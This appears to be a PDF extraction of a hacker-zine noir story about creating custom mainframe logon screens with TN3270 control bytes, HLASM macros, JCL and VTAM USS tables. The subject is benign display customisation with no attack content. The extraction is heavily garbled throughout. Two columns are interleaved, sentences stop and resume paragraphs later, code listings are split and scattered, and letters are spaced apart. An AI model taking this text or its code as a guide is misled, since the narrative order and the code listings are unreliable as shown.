don’t have money. I’m as cheap as a Garfield joke
self. (Little did I know I’d actually be begging to
in the Sunday papers. But I can do one thing well:
get by Cerberus.)
Mainframe EBCDIC Art.
The world of mainframes, it’s a different world.
A seedier world. One not well-travelled by the
I knew It was going to be a play on Cerberus, the
young, and often frequented by the harsh winds of
three-headed dog. Finding that ASCII was the easy
corporate rule. Nothing on the mainframe comes
part. ASCII art has been around since the creation
easy or free. If you want to make art, you’ll need
of the keyboard. People need to make art, regard-
more than just a keyboard.
less of the tool. Finding ASCII art was going to be
I started innocently enough, naively searching
simple. Google, DuckDuckGo, or in desperate times
simple terms like “change mainframe logon screen.” I
and lots of good scotch, Bing, will supply the base
stumbled around search results, and into chatrooms
that I need to create my master piece. The first
like a newborn giraffe learning to walk. You know
response for a search for “Cerberus” and “ASCII”
the type, a conversation where everyone is trying to
yielded my three-headed muse.
42I was ushered in. I felt Tommy slam the door shut
and heard no fewer than three cheap chain-locks set
in to place.
Tommy’s place was stark white, like a website
from the early 90s. No art, no flashing neon, just
plain white with some printouts stuck on the white
walls and the quiet hum of an unseen computer. The
kind of place that makes you want to slowly wander
around an Ikea. Tommy liked to keep things clean
and simple and this place reflected that.
Tommy, in his white lab coat, was a just a reg-
ular man. As regular and boring as a vodka with
lime and soda, if vodka, with lime and soda, wore
large rimmed glasses. But he knew his way around
TN3270, and that’s what I needed right now.
“So, I hear you need some help with TN3270?”
Tommy asked. He already knew why I was there.
“Yeah, I can’t figure this garbage out and I need
help writing my own,” I replied.
Tommy sighed and began explaining what I
needed to know. He walked over to one of three
whiteboards in the room.
“The key thing you need to know is that after
you negotiate TN3270 there are seven control char-
acters. But if all you want to do it make art, you
only need to know these four:
prove who’s the smartest in the room. While ulti-
mately useless, those initial searches taught me three
things: I needed to understand the TN3270 pro-
tocol, z/OS High Level Assembler (HLASM), and
what the hell a VTAM and the USS Table were.
–——–
———
—–—–
I always knew I would have to learn TN3270.
It’s the core of mainframe–user interaction. That
green screen you see in movies when they say some-
one “just hacked a mainframe.” I just never thought
it would be to make art for my friends. TN3270
is based on Telnet. Or put another way, Telnet is
to TN3270 as a bike is to an expensive motorcycle.
They sort of start out the same but after you make
the wheels and frame they’re about as different as
every two-bit shoe shine.
Looking at the way mainframes and their clients
talk to one another is easy enough to understand,
at first. Take a look at Figure 18.
For anyone who understood telnet like I did, this
handshake was easy enough to understand.
IAC : T e l n e t Command
2 DO/WILL : Do t h i s ! I w i l l !
SB : sub command
But that’s where it ended. Once the client was
done negotiating the telnet options, the rest of the
data looked garbled if you weren’t trained to spot
it.
You see, mainframes came from looms. Looms
spoke in punchcards which eventually moved to
computers speaking EBCDIC. So, mainframes kept
the language alive, like a small Quebec town trying
to keep French alive. That TN3270 data was now
going to be driven by an exclusively EBCDIC char-
acter set. All the rest of the options negotiated, and
commands sent, would be in this strange, ancient
language. Lucky for me, my friend Tommy knows all
about TN3270 and EBCDIC. 25 And Tommy owed
me a favor.
–——–
———
—–—–
Just past a Chinese restaurant’s dumpster was
the entrance to Tommy’s place. You’d never know
it even existed unless you went down the alleyway
to relieve yourself. As I approached the dark green
door, I couldn’t help but notice the pungent smell
of decaying cabbage and dreams, steam billowing
out of a vent smelled vaguely of pork dumplings. I
knocked three times. The door opened suddenly and
1 SF
SBA
3 IC
SFE
−
−
−
−
"\x1D"
"\ x11 "
"\ x13 "
"\ x29 "
−
−
−
−
aka
aka
aka
aka
Start Field
Set Buffer Attribute
I n s e r t Cursor
S t a r t F i e l d Extended
“Unlike telnet, TN3270 is a basically 1920 char-
acter string, for the original 24×80 size. The ter-
minal knows you’re starting ’cuz the first byte you
send is a command (i.e. \x05) followed by a Write
Control Character (WCC). For you, sir artist, you’ll
want to send ‘Erase/Write/Alternate.’ or \xF5\x7A.
This gives you a blank canvas to work with by clear-
ing the screen and resetting the terminal.
“The remaining makeup of the screen is up to
you. You use SBA to tell the terminal where
you want your cursor to be, then use the ‘Start
Field’/‘Start Field Extended’ commands to tell the
terminal what kind of field it is going to be, also
known as an attribute. Start field is used to lock
and unlock the screen, but for your art it doesn’t
matter.
“One thing you’ll need to watch out for, anytime
you use SF/SFE, is that it takes up one byte on the
25 http://www.tommysprinkle.com/mvs/P3270/ctlchars.htm
431 TN3270 (KINGPIN, 2 3 )
TN3270 (KINGPIN, 2 3 )
3 TN3270 (KINGPIN, 2 3 )
TN3270 (KINGPIN, 2 3 )
5 TN3270 (KINGPIN, 2 3 )
TN3270 (KINGPIN, 2 3 )
7 TN3270 (KINGPIN, 2 3 )
TN3270 (KINGPIN, 2 3 )
9 TN3270 (KINGPIN, 2 3 ) :
:
:
:
:
:
:
:
:
11 TN3270 (KINGPIN, 2 3 )
TN3270 (KINGPIN, 2 3 )
13 TN3270 (KINGPIN, 2 3 )
TN3270 (KINGPIN, 2 3 )
15 TN3270 (KINGPIN, 2 3 )
TN3270 (KINGPIN, 2 3 ) :
:
:
:
:
:
<< IAC DO TN3270
>> IAC WILL TN3270
E n t e r i n g TN3270 Mode :
C r e a t i n g Empty IBM−3278−2 B u f f e r
C r e a t e d b u f f e r s o f l e n g t h : 1920
C u r r e n t S t a t e : ’ TN3270E mode ’
<< IAC SB TN3270 TN3270E_SEND TN3270E_DEVICE_TYPE SE
>> IAC SB TN3270 TN3270E_DEVICE_TYPE TN3270E_REQUEST IBM−3278−2−E IAC SE
<< IAC SB TN3270 TN3270E_DEVICE_TYPE TN3270E_IS I B M − 3 2 7 8 − 2 − E
TN3270E_CONNECT S M O G L U 0 2 SE
Confirmed Terminal Type : IBM−3278−2−E
LU Name : SMOGLU02
>> IAC SB TN3270 TN3270E_FUNCTIONS TN3270E_REQUEST IAC SE
<< IAC SB TN3270 TN3270E_FUNCTIONS TN3270E_IS SE
>> IAC SB TN3270 TN3270E_FUNCTIONS TN3270E_REQUEST IAC SE
P r o c e s s i n g TN3270 Data
Figure 18. TN3270 Packet Trace
wraps at every 80 characters. But let’s talk about
SF and SFE.”
“In your, frankly simple, example,” Tommy con-
tinued, “you’d never get any color. To do that, we
need to talk about the Start Field Extended (\x29)
command. That command is made up of the SFE
byte itself, followed by a byte for the number of at-
tributes, and then the attributes themselves.
“There’s two attributes we care about: SF
(\xC0), and the most important one, which I’ll get
to in a minute. SF is what we use like above to con-
trol the screen. If we wanted to protect the screen
from being edited we could set it to \xF8.
“Now, you’ll want to listen closely because this
attribute is arguably the most important to you.
The color attribute (\x42) lets you set a color. Your
choices are \xF1 through \xF7.”
screen. Setting the buffer location does not. Once
you’re done with your art, you’ll need to place the
cursor somewhere, using IC.”
Starting to understand, I headed to the white
board and wrote Figure 19 in black marker.
“Yes! That’s it!” exclaimed Tommy. “With what
you have now, you could make a monochrome mas-
terpiece! Keep in mind that the SF eats up one
space. So basically you could fill out the rest of the
screen’s 1,919 characters, remembering that the line
F1
2 F2
F3
4 F4
F5
6 F6
F7
Blue
Red
Pink
Green
Turquoise
Yellow
White
\ x05 WCC SBA
0
0
SF
0
Here L i e s T r o u b l e IC
2 \ x05 \x7A \ x11 \ x00 \ x00 \x1D \ x00 Here L i e s T r o u b l e \ x13
Figure 19. Placing the cursor after drawing.
441 \ x05 WCC SBA
0
0
SF
0 Here L i e s T r o u b l e SFE 1 COLOR WHITE Double IC
\ x05 \x7A \ x11 \ x00 \ x00 \x1D \ x00 Here L i e s T r o u b l e \ x29 \ x01 \ x42 \xF7 Double \ x13
for a favorite firearm, guess I was wrong.
“You’ve given out free TN3270 help for the last
time Tommy!” Rico shouts, and I heard the familiar
sound of a gun being reloaded. I took a quick peek
from my hiding place and noticed that Rico hadn’t
even bothered to take cover, still standing in the
doorway. Not wanting my epitaph to read, “Here
lies a coward who died learning TN3270 behind a
Chinese restaurant,” I pulled out my Colt detective
special and opened fire. My aim had always been
atrocious, but I fired blindly in the direction of the
door, heard a yelp, and then silence.
Tommy popped his head above the desk, “He’s
gone, looks like he ran off, you better get out of here
in case he and his goons return.”
I took this as my cue and headed towards the
door. I noticed part of the frame had splintered,
and in the center of those splinters was my slug.
looks like I just missed Rico.
Tommy grabbed my arm as I’m about to leave,
“You still need to learn some assembler and VTAM,
go talk to Dave at The Empress, he can help you
out. But never come back here again, you’re too
much trouble.”
–——–
———
—–—–
The Empress. On the books it was a hotel. Off
the books it’s where you went when you wanted
help forgetting about the outside world. The lobby
looked and smelled like a cheap computer case that
hadn’t been cleaned out for years. Half the lights in
the chandelier didn’t work, and it cast odd shadows
on the furniture, giving the impression someone was
there, watching you. It was the kind of place Euro-
pean tourists booked because Travelocity got them a
great deal, but the price would immediately change
once they arrived. No one came to the Empress for
its good looks. Not-quite-top-40 music emanated
from the barroom.
I walked to the front desk, where a young man
with a name tag that said “No Name” looked me up
and down. “Can I help you?” Millennial sarcasm
dripped off of every syllable. “I need to speak to
Dave,” I replied. The clerk’s eyes widened a little,
he quickly looked around and whispered “follow me.”
Tommy grabs the black marker from my hand
and begins adding to my simple example.
“So, with a bit of this code, we can add a color
statement to your commands. Remember to move
the cursor to the end though.
“There’s one last thing you should know, but it’s
a little advanced. You can set the location using
SBA followed by a row/column value. Right now,
you’ve set the buffer to 0/0. But using this special
table,” Tommy pointed to a printout he had lam-
inated and stuck to his wall, 26 “we can point the
buffer anywhere we—”
Just then the door burst open, the sounds of
those cheap locks breaking and hitting the floor
echoed through the room. A dark figure stood in
the doorway holding some type of automatic gun,
which I couldn’t place. Tommy quickly took cover
behind a desk and I followed suit. I heard a voice
yell out “How dare you teach him the way! He might
not have the access he needs! Did you ask if he’s al-
lowed to make the kind of changes you’re teaching?
He should’ve spoken to his system programmer and
read the manuals!”
Tommy, visibly shaken, shouted, “Rico! I’m
sorry! I owed someone a favor and. . . ”
Rico opened fire. Little pieces of shattered
whiteboard hitting me in the face. He wasn’t aim-
ing for us, but had destroyed our notes on the white
board. I looked over and saw Tommy cowering un-
der his desk, I had figured ‘Tommy’ was a nickname
26 http://www.tommysprinkle.com/mvs/P3270/bufaddr.htm
45know?” he asked.
“Tommy sent me,” I replied.
Dave takes a long pull on his coffin nail, “Shit,”
he says exhaling a large puff, “you tell Tommy that
we’re square after this. I assume you’re here to learn
HLASM? Can I ask why?”
“I’m trying to make some my mainframe look
beter.” I replied.
Dave wasn’t a tall man, but his stature, deep
voice, and frame more than made up for it. The
type of man you could trust to knock you out in one
punch. His white hotel uniform was stained with
what I hoped wasn’t blood.
He sighed and said “this way.”
Dave led me to a small room off the laundry area
with some books on the wall, lit by a single, bare
bulb in the ceiling fixture. A black chalkboard stood
in one corner, an old terminal on a standing desk, all
the rage these days, at in the other. The walls were
bare concrete. “I assume you already know JCL?”
queried Dave.
“Yes” I replied with a failed attempt at sarcasm,
“of course I know JCL.” 28
“Good, this will be easy then.” He took another
pull of his smoke and began writing on the black-
board, “There’re four executables available to you
to compile an HLASM program on the mainframe.
They are:
ASMAC
2 ASMACL
ASMACLG
4 ASMACG
−
−
−
−
Assembles o n l y
Assembles and l i n k e d i t s
Assembles , l i n k s and r u n s
Assembles , u s e s a l o a d e r t o run
Dave walked over to the terminal and pulled up
a file on the screen. “You need to pass it some op-
tions, like this,” he said, pointing to a line on the
screen:
//BUILD
EXEC
2 //C . SYSLIB DD
//
DD
4 //C . SYSIN
DD
The clerk walked me past the kitchen, through
the back hallways, in to the laundry room. He ush-
ered me in, then abruptly left. A sole person was
folding linens in front of an industrial washing ma-
chine, a freshly lit cigarette hung loosely from his
lips. The fluorescent light turned his skin a pale
shade of blue. “Dave?” I called out. 27 Dave put the
bed sheet down and walked over. ‘Who wants to
“Anything you type on the next line, after the
* must be in HLASM and will be compiled by AS-
MACL. Don’t worry about finding it, ASMACL is
given to us by Big Blue.” Dave’s calloused fingers
flew over the keyboard and a moment later I was
staring at a blank file with the JCL job card and
27 http://csc.columbusstate.edu/woolbright/WOOLBRIG.htm
28 PoCkGTFO
ASMACL
DSN=SYS1 . SISTMAC1 , DISP=SHR
DSN=SYS1 . MACLIB, DISP=SHR
∗
12:6, a JCL Adventure with Network Job Entries
46compiler stuff filled out. “First, there’re some rules
with HLASM you should know. Each line can either
be an instruction, continuation, or comment. Com-
ments start with ‘*’. A Continuation line means
that in the previous line there’s a character (any
character, doesn’t matter which) in column 72, and
the continued line itself must start on column 16.”
“You with me so far?”
I nodded.
“Good. Now, If it’s not a comment or a contin-
uation, the line can be broken down like so:
“The first 10 characters can be empty or be a
name/label. Following that you have your instruc-
tion, a space, then your operands for that instruc-
tion. Anything after the operands is a comment un-
til the 71st column. Here’s a dirty example.” (Fig-
ure 20.)
“Every line can have a name. In HLASM you can
create basic variables with an & in front of them.
But not every line needs a name. Take a look at
these three lines:
&BLUE
2
&KINGPIN SETC ’BOSS ’
2 &BOSSBEGN SETC ’B’ . ’ & KINGPIN ’
&BOSSEND SETC ’E’ . ’ & KINGPIN ’
4 &BOSSBEGN EQU ∗
∗ SOME CODE
6 &BOSSEND EQU ∗
“Lets break this down so you can see what the
compiler would do:
&KINGPIN = ’BOSS ’
2 &BOSSBEGN = BBOSS
&BOSSEND = EBOSS
4
BBOSS
EQU ∗
6 ∗ SOME CODE
EBOSS
EQU ∗
“This understanding will come in handy when
you’re making a USS Table.” I still didn’t know
what a USS Table was, but I let him go on. “If you
have stuff you’re going to do over and over again, it
would be easier to make a function, or in HLASM a
macro, to handle the various request types. Macros
are easy. On a single line you declare ‘MACRO’ in col-
umn 10. The next line you give the macro a name,
and it’s operands. You end a macro with the word
‘MEND’ in column 10 on a single line. For example:”
SETC ’X’ ’ 2 9 0 1 4 2 F1 ’
DC &BLUE Make i t b l u e !
DC C’ Big Blue ’ S imp le t e x t
“Line one sets a symbol/label to &BLUE. If
Tommy did his job right you should be able to recog-
nize what it is supposed to do. The next line is DC,
Declare Constant. Notice &BLUE has an X. That
means it’s in hex. When we want to send text, we
can use ‘C’ for CHAR. If we wanted we could’ve writ-
ten the above like this.” I watched as his fingers
danced across the keyboard.
1
caveat with using variables in HLASM: The assem-
bler will replace any value you have with the vari-
able, take a look at this:
1
&NAME
3
5
MACRO
SCREEN &MSG=. ,&TEXT=.
DC &MSG
DC &TEXT
MEND
∗
DC X’ 2 9 0 1 4 2 F1 ’
DC C’ Big Blue ’
7
SCREEN MSG=03 ,TEXT=’ Big Blue ’
I thought I was starting to get it, so I decided to
ask a question. “How would we do an IF statement?”
I asked.
“But you’ll likely be switching colors, so setting
them all to variables makes your life easier. One
1−−−−−−−−10−−−−−−−−20−−−−−−−−30−−−−−−−−40−−−−−−−−50−−−−−−−−60−−−−−−−−70−−−−−−−−80
2 SYMBOL
DC X’DEADBEEF’ A comment
∗ Another comment
4
DC C’ H e l l o World ’ I ’m a s i n g l e l i n e
DC C’HELLO
X
6
WORLD’ I ’m a c o n t i n u a t i o n
Figure 20. Dave’s Example
47a rather large slide deck in to my chest, at least 400
pages thick. 29
Dave smiles, but only a little, and walks back
over to the blackboard and scribbles out the follow-
ing:
No Name told me to follow him yet again. As
we left the laundry room I saw Dave stuffing soiled
linens in to one of those washers; this time there’s no
wondering if it was blood or not. No Name ushered
me down a different hallway than the one we came
in. He walked quickly, with purpose. I struggle to
keep up.
1 &MSG
SETC C’ 0 4 ’
AIF ( ’&MSG’ NE ’ 0 2 ’ ) . SKIP
3
DC C’ Not Equal t o 2 ’
. SKIP
ANOP
5
DC C’ End o f Line ’
“In HLASM you can use the AIF instruction. It’s
kind of like an IF. Here we have some code that will
print ‘Not Equal to 2’ and ‘End of Line.’ If we set
&MSG to ‘02’ it would jump ahead to .SKIP, what
Big Blue would call a label.
“I see you staring at that ANOP. I know what
you’re thinking, and the answer is yes. It’s exactly
like a NOP in x86. Except it’s not an opcode, but
a HLASM assembler instruction.”
Dave headed back to the terminal and quickly
scrolled to the bottom. “There’s one last thing, since
we’re using ASMACL you need to tell the compiler
where to put the compiled files. Take a look at this.”
We ended up at a door labeled ‘Emergency Exit.’
No Name opened the door and I headed through.
Before I could turn around to say thanks, the big
metal door slammed closed. I found myself in an-
other dead-end alleyway. The air was cool now, the
wind moist, betraying a rain fall that was yet to
start.
I began heading towards the road when a shad-
owy figure stepped into the alley. I couldn’t make
out what he looked like, the neon signs behind him
made a perfect silhouette. But I could already tell
by his stance I was in trouble.
1 //L .SYSLMOD DD DISP=SHR, DSN=USER .VTAMLIB
//L . SYSIN
DD ∗
3
NAME USSCORP(R)
“So,” the figure called out, “the boss tells me
you’re trying to change the USS Table eh?” I figured
this must be one of Rico’s goons.
Dave tapped on the glowing screen. “This line
right here. This tells the compiler to make a file
USSCORP in the folder USER.VTAMLIB.” I knew
he meant Member and Partitioned Dataset but I
figured Dave was dumbing things down for me and
didn’t want to interrupt. “That’s where your new
USS Table goes,” he continued.
I jumped as someone softly knocked on the door,
guess I was still a little jumpy from my encounter
at Tommy’s. I saw through the round window in
the door that the clerk had returned. Dave headed
over and opened the door. I couldn’t quite make out
what they were saying to each other. Dave looked
at his watch and turned to me, “Look, this has been
swell, but you gotta get outta here. If my boss finds
out I taught you this there’ll be hell to pay and I’m
not looking to sleep with the fishes tonight—or any
night. Sorry we’re cutting this short, normally I’d
be teaching you about the 16 registers and program
entrance and exit, but we don’t have time for that.
And besides, you don’t need it to be a VTAM artist,
but if you want to learn, read this.” And he shoved
29 unzip
“I don’t mean nothing by it,” I replied, “I’m just
trying to make my mainframe nicer.”
“Rico has a message for you ‘if you’re trying to
change the mainframe you should be talking to the
people who run your mainframe, I’ve had enough of
this business.’ ”
The gunshot echoed through the alleyway, the
round hitting me square in the chest like a gamer
punching his monitor in a rage quit. I landed on
flat my back, smacked my head on the cold concrete,
and sent pages of assembler lessons flying through
the air. The wind knocked out of me, I felt the
blackness take hold as I lay on the sidewalk. I could
barely make out the figure standing over me, whis-
pering “when you get to the pearly gates, tell ’em
the EF Boys sent ya.”
pocorgtfo17.pdf Asm-1.PPTx
48You know those dreams you have. The kind
where you’re in a water park, floating along a lazy
river, or down a waterslide. I was having one of
those. It was nice. Until I realized why I was dream-
ing of getting wet. I woke face up, in an alleyway,
the rain pounding me mercilessly. My trench coat
was drenched by the downpour. I stood up, slowly,
still dizzy from getting knocked out.
How had I survived? I looked around and saw
papers strewn about the alley. Something shiny, just
next to where I took my forced nap, caught my eye.
It was a neat pile of papers, held together by a dim-
ple on the top sheet. I took a closer look and picked
up the pages.
Well I’ll be damned, the 400+ pages of assem-
bler material took the bullet for me. Almost square
in the middle was the bullet meant to end my jour-
ney. I eternally grateful that Dave had given me
those pages. Now, determined more than ever to
finish what I started, I headed towards the street.
I had two of the three pieces to the puzzle, but I
needed dry clothes and my office was closer than
going home.
–——–
———
—–—–
Nestled above a tech start-up on its last legs was
a door that read ’Soldier of FORTRAN: Mainframe
Hacker Extraordinaire.’ Inside was a desk, a chair,
an LCD monitor and a PC older than the startup. A
window, a quarter of the Venetian blinds torn free,
looked out over the street. I didn’t bother turning
on the lights. The orange light that bled in from
the lamppost on the street was enough. I pulled out
my phone, put it on the desk, and started changing
in to my dry clothes. The clothes were for when I
hoped I would start biking to work which, as with
all new year’s resolutions, were yesterday’s dream.
Now dry, I decided to power on my PC and
take some notes. I wrote down what I knew about
TN3270 thanks to Tommy and HLASM courtesy of
Dave. I was still missing a big piece. Where could
I learn about this USS Table. My searches all led
to the same place: The Mailing-List. A terrible bar
on the other side of town I had no desire to visit.
The Mailing-List, or ‘Dash L’ as some people called
it, was filled with some of the meanest, least helpful
individuals on this Big Blue planet. I was likely to
get chased out of the place before I was even done
asking my question, let alone receiving an answer.
Don’t get me wrong, sometimes Dash L had some
great conversations, I know because I often lurk
there for information I can use. But I had never
worked up the courage to ask a question there, lest
I be banned for life. But, with nothing else to go on
I grabbed my coat and umbrella and headed for the
door.
Just then, my phone rang. I didn’t recognize the
name-Nigel, or the number. I decided to answer the
phone. “Who’s this, how’d you get my private num-
ber?” No reply. I went to hang up the phone when I
heard, “try searching for USSTAB and MSG10.” My
phone vibrated, letting me know the call was over.
I ran to the window and peered out in to the rainy
night. The street was empty except for a man with
an umbrella putting his phone away. I ran down the
stairs and caught a glimpse of the man as he got
into his Tesla and sped off.
Back at my desk, I searched for USSTAB and
MSG10 and one name kept coming back: Big John.
I knew Big John, of course. Anyone who did main-
frame hacking knew him. He now played the ivories
over at a fancy new club, the Duchess. My dusty
work clothes would have to be fancy enough.
–——–
———
—–—–
You wouldn’t know the Duchess was much, just
by looking at it. A single purple bulb above a bright
red vinyl entrance. The lamp shade cast a triangle of
light over the door. The only giveaway that this was
a happening place was the sound of 80s Synth rolling
down the streets. Not the cheap elevator synth you
get while waiting for your coffee, this was real synth:
soulful and painful. The kind that made you doubt
yourself and your life choices.
I walked to the door and knocked. A slit opened
up, “Can we help you?” a woman’s voice asked. I
couldn’t wait for this new speakeasy revival trend
to die. “Yes,” I replied, “I’m here to see Big John.”
“You have a reservation?” she asked.
“Nope, just here to see Big John.”
“Honey, you outta luck. We got a whole room of
people here to see Big John, and they got reserva-
tions!”
“How much sweetener to see him play tonight?”
I ask.
A second slot near my dad gut opened up, and a
drawer popped out, almost like the door was happy
to see me. I placed the only fifty I had in the tray.
The drawer and slit closed and the door opened.
A young woman took my coat and brought me to
a table. I took my seat and casually looked around.
The room was dimly lit, with most of the light com-
ing from the stage. Smoke hung in the air like a
summer haze waiting for a good thunderstorm. A
49waitress asked, “Drink sir?” I ordered a dirty mar-
tini and enjoyed the rest of the show. It’d been a
shit day, I needed a break.
Once the show was done and the band started
to pack up, I walked up to Big John. “Appar-
ently you’re a man who can help me with USSTAB
and some TN3270 animations.” I say. He finished
putting away his keytar in its carrying case. “I could
be, what’s in it for me?” My wallet was empty so
I figured a play on his emotional side might work,
“You’d get a chance to piss off Rico and the EF
Gang.”
Big John looked at me and smiled. “Anything to
piss of that hothead, follow me.” I grabbed my coat
from the front and followed him.
Big John was the type of guy who lived up to
the name. He was massive. Use to play professional
football before he got injured and went back to his
original loves: hacking and piano. Long dark hair
and an even longer and darker beard made him look
menacing. But if you ever knew Big John, you’d
know he was just a big ‘ol softy.
John led me to another alleyway behind the
Duchess. What was it with this city and alleyways?
It looked like the rain had let up, but it had left a
cold, damp feeling in the air. Parked in the alley was
a van, with a wizard riding a corvette painted on the
side. Big John opened the back, set his keytar down
and motioned for me to get in the van.
Inside was a nicer office space than I have. Ex-
pensive, custom mechanical keyboards lined one
wall. Large 4k monitors hung on moveable arms.
An Aeron chair was bolted to the floor. Somewhere,
invisible to me, was a computer powerful enough to
drive this setup.
“So, I take it you’ve been to both Tommy and
Dave already?” he asked over the clicking of his me-
chanical keyboard as he logged on.
“Yes,” I reply. “I think I understand enough to
get started making my own logon screens. I can con-
trol the flow and color of a TN3270 session, and I
know how to use HLASM to do so. But Dave kept
referring to things like MSGs and a USS Table which
makes no sense to me.”
Big John chuckled and sat down, lighting what
looked like a hand-rolled cigarette but smelled like
a skunk. “Don’t worry about Dave,” he said, taking
a few puffs, “he’s an ex-EF Boy, he’s still trying to
get use to sharing information that people can un-
derstand. Sometimes he’s still a little cryptic. Let’s
get started.”
“When you connect to a mainframe, nine times
outta ten its going to be VTAM,” Big John explains.
“VTAM is like the first screen of an infocom
game. It lets you know where you are, but from
there it’s up to you where you go, you get me?” he
asks between puffs.
I did, and I didn’t. All I wanted to do was make
pretty mainframes.
“First thing you gotta know about VTAM is
that it uses what it calls Unformatted System Ser-
vices tables. Or USS tables for short. This file
is normally specified in your TN3270 configuration
file.” Big John swiveled his chair and launched his
TN3270 client, connected, and opened a file labeled
‘USER.TCPPARMS(TN3270)’ He pointed to a spe-
cific line:
1 USSTCP USSECORP
“This line right here tells TCP to tell VTAM
to use the file ’USSECORP’ when a client con-
nects.” he said, closing the file. He then opened
’USER.PROCLIB(TN3270)’ and pointed at a dif-
ferent line:
1 //STEPLIB
DD DSN=USER .VTAMLIB, DISP=SHR
“And that right there is where we’re gonna find
USSECORP,” again he closed the current file and
opened another folder: ‘USER.VTAMLIB’. And
sure enough, glowing a deep blue, in the back of
this van was USSECORP:
50would replace those items with the actual date/time.
BUF010 is a pointer. It points to a data structure.
The first thing BUFFER expects is the length of
the buffer. Since we might add/remove more to our
screen we can use just get the total size by subtract-
ing the location of END010 by BEGIN010. Every-
thing else inside there is what will be sent to VTAM
to send to your TN3270 emulator. You keepin’ up
my man?”
“Yeah,” I replied. “I think I got it. That line
X’2902C0F842F1’ is a TN3270 command setting the
text blue (\x42 \xF1) and that other line, two down,
with 10C, just means to repeat that space ten times
before we insert the cursor.”
“So now you know where to send your compiled
HLASM, your ’L.SYSLMOD’. Just overwrite that
file and you’ll be good to go. Oh wait!” John
laughed, “I haven’t explained how you can use the
USS Table to make it less boring. Right, well it’s
easy—ish.
“The USS Table is basically a set of macros you
call to tell VTAM what to do on each message or
command it receives. Let’s take a look at this ex-
ample.” He pointed to the other screen.
John smirked, “well look at you, the artist. When
you’re done setting USS Tab stuff you just end
it with USSEND. Keep in mind, there’re fourteen
MSGs, not that you’ll need to deal with them if you
don’t want to.”
Big John got up and settled into the driver’s seat,
“Where ya headin?” he asked. I guess he was done
teaching me what I needed to learn. “Fifth and Gib-
son,” I replied. Back to my office. I was eager to get
started on my own screen now that I knew what I
was doing. I buckled in next to Big John and got
to the office, thankfully no sight of Rico or his EF
Boys.
–——–
———
—–—–
1 USSN
3
5
7
9
11
13
TITLE ’GROOVY SCREEN’
USSTAB FORMAT=DYNAMIC
USSMSG MSG=10 ,BUFFER=(BUF010 ,SCAN)
BUF010 DS 0H
DC AL2( END010−BUF010 )
DC X’ F57A ’
DC
X’ 2 9 0 2 C0F842F1 ’
DC
C’ H e l l o Flynn ’
DC
10C’ ’
DC
X’ 1 3 ’ I n s e r t Cursor
END010 EQU ∗
END
USSEND
END
Back at my desk I created two things. First,
I made a quick and dirty python script so I could
rapidly prototype TN3270 command ideas I had (in-
cluded). Second I decided to code up a macro to
handle all the MSG types:
“We start the USS Table with the Macro
’USSTAB’ passing it the argument FORMAT. Just
always set it to DYNAMIC. This is saying, from
here on out we’re in USSTAB. The next line”
1 USSMSG MSG=10 ,BUFFER=(BUF010 ,SCAN)
“This calls the USSMSG macro, which you can
read in SYS1.SISTMAC1(USSMSG). You can pass
it a bunch of variables, but for you, just pass it
the MSG= and BUFFER= variables. MSG=10
in our case is the default ‘hey you just connected’
message. BUFFER takes two arguments. SCAN
will look through and replace any instance of key-
words with the actual variable. Some examples
would be @@@@DATE and @@@@TIME. Which
First we needed that sweet, sweet JCL header:
1 //COOLSCRN JOB ’ b u i l d t s o s c r e e n ’ , ’ IBMUSER’ ,
NOTIFY=&SYSUID ,
//
MSGCLASS=H, MSGLEVEL= ( 1 , 1 )
3 //BUILD
EXEC ASMACL
//C . SYSLIB DD DSN=SYS1 . SISTMAC1 , DISP=SHR
5 //
DD DSN=SYS1 . MACLIB, DISP=SHR
//C . SYSIN
DD ∗
51Next, I needed a way to handle all the messages.
I whipped up a quick macro, with all the colors I
might need.
After that I call the macro for every msg type
and end the HLASM.
SCREEN MSG=00 ,TEXT= ’ L a u n c h i n y o u r program , s e e ’
SCREEN MSG=01 ,TEXT= ’ I d o u b t you meant t o do t h a t ’
SCREEN MSG=02 ,TEXT= ’No , s e r i o u s l y ’
SCREEN MSG=03 ,TEXT= ’ P a r a m e t e r i s u n r e c o g n i z e d ! ’
SCREEN MSG=04 ,TEXT= ’ P a r a m e t e r w i t h v a l u e i s i n v a l i d
’
SCREEN MSG=05 ,TEXT= ’The k e y you p r e s s e d i s i n a c t i v e
’
SCREEN MSG=06 ,TEXT= ’ T h e r e i s n o t s u c h s e s s i o n . ’
SCREEN MSG=08 ,TEXT= ’Command f a i l e d a s s t o r a g e
shortage . ’
SCREEN MSG=10 ,TEXT= ’
’
SCREEN MSG=11 ,TEXT= ’ Your s e s s i o n h a s ended ’
SCREEN MSG=12 ,TEXT= ’ R e q u i r e d p a r a m e t e r i s m i s s i n g ’
SCREEN MSG=14 ,TEXT= ’ T h e r e i s an u n d e f i n e d USS
message ’
2
4
2
4
6
8
10
12
14
16
18
20
22
MACRO
&NAME
SCREEN &MSG=. ,&TEXT=.
AIF
( ’&MSG’ EQ ’ . ’ OR ’&TEXT’ EQ
’ . ’ ) .END
LCLC &BFNAME,&BFSTART,&BFEND
&BLUE
SETC ’X’ ’ 2 9 0 1 4 2 F1 ’ ’ ’
&RED
SETC ’X’ ’ 2 9 0 1 4 2 F2 ’ ’ ’
&PINK
SETC ’X’ ’ 2 9 0 1 4 2 F3 ’ ’ ’
&GREEN
SETC ’X’ ’ 2 9 0 1 4 2 F4 ’ ’ ’
&TURQ
SETC ’X’ ’ 2 9 0 1 4 2 F5 ’ ’ ’
&YELLOW SETC ’X’ ’ 2 9 0 1 4 2 F6 ’ ’ ’
&WHITE
SETC ’X’ ’ 2 9 0 1 4 2 F7 ’ ’ ’
&BFNAME SETC ’BUF’ . ’ &MSG’
&BFBEGIN SETC ’&BFNAME’ . ’ B’
&BFEND
SETC ’&BFNAME’ . ’ E ’
. BEGIN
DS
0F
&BFNAME DC
AL2(&BFEND −&BFBEGIN)
&BFBEGIN EQU
∗
DC
X’ 0 5 F7 ’
DC
X’ 1 1 0 0 0 0 ’
∗ Fancy a r t g o e s h e r e
DC
X’ 1 3 ’
&BFEND
EQU
∗
.END
MEND
6
8
10
12
END
Finally, I added the JCL footer.
1 /∗
//L .SYSLMOD DD DSN=USER .VTAMLIB, DISP=SHR
3 //L . SYSIN
DD ∗
NAME USSN(R)
5 //∗
Happy with the code I’d just written I made my-
self a screen I’d be happy to see each and every day:
I needed to address each of the messages, so I
did that here. STDTRANS I copied from Big Blue
themselves.
1 USSTAB
USSTAB TABLE=STDTRANS,FORMAT=DYNAMIC
USSMSG MSG=00 ,BUFFER=(BUF00 , SCAN)
USSMSG MSG=01 ,BUFFER=(BUF01 , SCAN)
